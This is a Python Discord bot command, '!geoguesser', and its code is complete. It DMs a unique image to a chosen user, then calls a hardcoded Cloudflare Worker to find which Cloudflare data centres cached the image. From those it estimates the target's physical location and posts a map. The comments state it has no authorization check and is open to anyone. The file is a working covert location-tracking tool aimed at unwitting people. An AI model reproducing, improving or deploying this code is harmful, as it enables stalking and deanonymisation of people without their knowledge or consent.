"""
geoguesser.py – !geoguesser <@user>
Generates a unique random image, sends it to a target user,
then uses Cloudflare cache enumeration to estimate their location.
Public command – anyone can use it.
"""

import asyncio
import aiohttp
import io
import random
import time
import discord
from PIL import Image, ImageDraw
from datetime import datetime
import math
from urllib.parse import quote_plus

# ============ CONFIGURATION ============
WORKER_URL = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"
WAIT_SECONDS = 12  # seconds to wait for cache propagation
WORKER_TIMEOUT = 30  # worker call timeout in seconds
# =======================================

# Approximate coordinates for Cloudflare colos
COLO_COORDS = {
    'EWR': {'lat': 40.6895, 'lon': -74.1745, 'name': 'Newark, NJ'},
    'IAD': {'lat': 38.9531, 'lon': -77.4475, 'name': 'Washington DC'},
    'ATL': {'lat': 33.6407, 'lon': -84.4277, 'name': 'Atlanta, GA'},
    'ORD': {'lat': 41.9742, 'lon': -87.9073, 'name': 'Chicago, IL'},
    'DFW': {'lat': 32.8998, 'lon': -97.0403, 'name': 'Dallas, TX'},
    'LAX': {'lat': 33.9416, 'lon': -118.4085, 'name': 'Los Angeles, CA'},
    'SEA': {'lat': 47.4502, 'lon': -122.3088, 'name': 'Seattle, WA'},
    'MIA': {'lat': 25.7959, 'lon': -80.2870, 'name': 'Miami, FL'},
    'DEN': {'lat': 39.8561, 'lon': -104.6737, 'name': 'Denver, CO'},
    'PHX': {'lat': 33.4484, 'lon': -112.0740, 'name': 'Phoenix, AZ'},
    'SJC': {'lat': 37.3382, 'lon': -121.8863, 'name': 'San Jose, CA'},
    'PDX': {'lat': 45.5898, 'lon': -122.5951, 'name': 'Portland, OR'},
    'SLC': {'lat': 40.7608, 'lon': -111.8910, 'name': 'Salt Lake City, UT'},
    'MSP': {'lat': 44.9778, 'lon': -93.2650, 'name': 'Minneapolis, MN'},
    'STL': {'lat': 38.6270, 'lon': -90.1994, 'name': 'St. Louis, MO'},
    'BOS': {'lat': 42.3601, 'lon': -71.0589, 'name': 'Boston, MA'},
    'PHL': {'lat': 39.9526, 'lon': -75.1652, 'name': 'Philadelphia, PA'},
    'CLT': {'lat': 35.2271, 'lon': -80.8431, 'name': 'Charlotte, NC'},
    'TPA': {'lat': 27.9506, 'lon': -82.4572, 'name': 'Tampa, FL'},
    'HOU': {'lat': 29.7604, 'lon': -95.3698, 'name': 'Houston, TX'},
}


def generate_random_image_bytes():
    """Generate a 64x64 PNG with random pixels + random lines – returns raw bytes."""
    w, h = 64, 64
    img = Image.new('RGB', (w, h))
    pixels = img.load()
    for x in range(w):
        for y in range(h):
            pixels[x, y] = (random.randint(0, 255),
                            random.randint(0, 255),
                            random.randint(0, 255))
    draw = ImageDraw.Draw(img)
    # use w-1, h-1 to avoid off-by-one drawing outside bounds
    for _ in range(8):
        x1, y1 = random.randint(0, w - 1), random.randint(0, h - 1)
        x2, y2 = random.randint(0, w - 1), random.randint(0, h - 1)
        draw.line([(x1, y1), (x2, y2)], fill=(random.randint(0, 255),
                                              random.randint(0, 255),
                                              random.randint(0, 255)), width=2)
    img_bytes = io.BytesIO()
    img.save(img_bytes, format='PNG')
    return img_bytes.getvalue()


def haversine(lat1, lon1, lat2, lon2):
    """Distance in miles between two coordinates."""
    R = 3959
    lat1, lon1, lat2, lon2 = map(math.radians, [lat1, lon1, lat2, lon2])
    dlat = lat2 - lat1
    dlon = lon2 - lon1
    a = math.sin(dlat / 2) ** 2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon / 2) ** 2
    return R * 2 * math.asin(math.sqrt(a))


def _parse_user_id(arg: str):
    a = arg.strip()
    # formats: <@123>, <@!123>, or plain 123
    if a.startswith('<@') and a.endswith('>'):
        inner = a[2:-1]
        if inner.startswith('!'):
            inner = inner[1:]
        return int(inner)
    return int(a)


async def run(client, message, args):
    # No authorization check – anyone can use it
    if not args or not args.strip():
        await message.channel.send("Usage: `!geoguesser <@user or user_id>`")
        return

    target_arg = args.strip().split()[0]

    # Resolve target user
    try:
        user_id = _parse_user_id(target_arg)
        target = await client.fetch_user(user_id)
    except ValueError:
        await message.channel.send("❌ Invalid user ID or mention.")
        return
    except discord.NotFound:
        await message.channel.send("❌ User not found.")
        return
    except Exception as e:
        await message.channel.send(f"❌ Failed to resolve user: {e}")
        return

    # Status message
    status_msg = await message.channel.send("🖼️ Generating unique image...")

    # 1) Generate image bytes (unique each run)
    img_data = generate_random_image_bytes()

    # Unique filename so CDN entry is unique
    unique_filename = f"geo_{int(time.time())}_{random.randint(1000, 9999)}.png"

    # 2) Upload to Discord CDN (Cloudflare-backed) by sending to the current channel
    await status_msg.edit(content="📤 Uploading to Discord CDN...")
    try:
        # create a fresh BytesIO for the channel upload
        upload_file = io.BytesIO(img_data)
        upload_file.seek(0)
        sent = await message.channel.send(file=discord.File(upload_file, filename=unique_filename))
    except Exception as e:
        await status_msg.edit(content=f"❌ Failed to upload image: {e}")
        return

    if not getattr(sent, "attachments", None):
        await status_msg.edit(content="❌ No attachment URL returned from upload.")
        return

    image_url = sent.attachments[0].url

    # Try to delete temporary upload message but don't fail if we can't
    try:
        await sent.delete()
    except Exception:
        pass

    await status_msg.edit(content=f"✅ Image uploaded. Sending to target...")

    # 3) Send to target via DM (use fresh BytesIO)
    try:
        dm_file = io.BytesIO(img_data)
        dm_file.seek(0)
        await target.send(file=discord.File(dm_file, filename=unique_filename))
        await status_msg.edit(content=f"✅ Image sent to {target.name}.")
    except discord.Forbidden:
        await status_msg.edit(content="❌ Cannot DM that user (DMs closed).")
        return
    except Exception as e:
        await status_msg.edit(content=f"❌ Failed to send DM: {e}")
        return

    # 4) Wait for cache propagation
    await status_msg.edit(content=f"⏳ Waiting {WAIT_SECONDS} seconds for cache & notifications...")
    await asyncio.sleep(WAIT_SECONDS)

    # 5) Enumerate via Cloudflare Worker
    await status_msg.edit(content="🔍 Enumerating Cloudflare cache locations...")
    api_url = f"{WORKER_URL}?url={quote_plus(image_url)}"

    try:
        timeout = aiohttp.ClientTimeout(total=WORKER_TIMEOUT)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(api_url) as resp:
                if resp.status != 200:
                    await status_msg.edit(content=f"❌ Worker error (HTTP {resp.status})")
                    return
                try:
                    data = await resp.json()
                except Exception:
                    text = await resp.text()
                    await status_msg.edit(content=f"❌ Worker returned non-json response: {text[:400]}")
                    return
    except asyncio.TimeoutError:
        await status_msg.edit(content="❌ Worker timed out. The network might be slow.")
        return
    except Exception as e:
        await status_msg.edit(content=f"❌ Worker call failed: {e}")
        return

    datacenters = data.get('datacenters') or []
    hits = data.get('hits', 0)
    checked = data.get('checked', 0)

    if not datacenters:
        await status_msg.edit(content=(
            "❌ No cache hits found. The target may not have downloaded the image, "
            "or Cloudflare hasn't cached the asset yet. Try again, increase the wait time, "
            "or send a message to the target so their client fetches images."
        ))
        return

    # 6) Compute location
    coords = []
    colo_names = []
    for colo in datacenters:
        if colo in COLO_COORDS:
            coords.append(COLO_COORDS[colo])
            colo_names.append(f"{colo} ({COLO_COORDS[colo]['name']})")
        else:
            colo_names.append(colo)

    if coords:
        center_lat = sum(c['lat'] for c in coords) / len(coords)
        center_lon = sum(c['lon'] for c in coords) / len(coords)
        max_dist = max(haversine(center_lat, center_lon, c['lat'], c['lon']) for c in coords)
        radius_miles = max_dist * 1.5 if max_dist > 0 else 250

        # Generate static map URL (OpenStreetMap)
        markers = '|'.join([f"{c['lat']},{c['lon']},red-pushpin" for c in coords])
        map_param = quote_plus(markers)
        map_url = f"https://staticmap.openstreetmap.de/staticmap.php?center={center_lat},{center_lon}&zoom=5&size=600x400&markers={map_param}&maptype=mapnik"

        # If the map URL becomes extremely long (too many markers), fall back to a simple center map without markers
        if len(map_url) > 1800:
            map_url = f"https://staticmap.openstreetmap.de/staticmap.php?center={center_lat},{center_lon}&zoom=5&size=600x400&maptype=mapnik"

        # Build embed
        embed = discord.Embed(
            title="📍 GeoGuesser – Location Estimate",
            description=(
                f"**Target:** {target.name}\n"
                f"**Image URL:** [Link]({image_url})\n"
                f"**Datacenters found:** {len(datacenters)}\n"
                f"**Estimated radius:** ~{radius_miles:.0f} miles"
            ),
            color=0x00ff00,
            timestamp=datetime.utcnow()
        )

        # Limit datacenter list length inside embed field
        datacenter_field = "\n".join(colo_names[:12])
        if len(colo_names) > 12:
            datacenter_field += f"\n... and {len(colo_names) - 12} more"

        embed.add_field(name="🌐 Datacenters", value=datacenter_field, inline=False)
        embed.add_field(name="📊 Scan Stats", value=f"Checked: {checked}\nHits: {hits}", inline=True)
        embed.add_field(name="📍 Center", value=f"{center_lat:.4f}, {center_lon:.4f}", inline=True)
        embed.set_footer(text="Powered by Cloudflare Cache Enumeration")
        embed.set_image(url=map_url)

        # send final result
        try:
            await status_msg.delete()
        except Exception:
            pass
        await message.channel.send(embed=embed)
    else:
        await status_msg.edit(content=f"Found datacenters: {', '.join(datacenters)} – but no coordinates available for these colos.")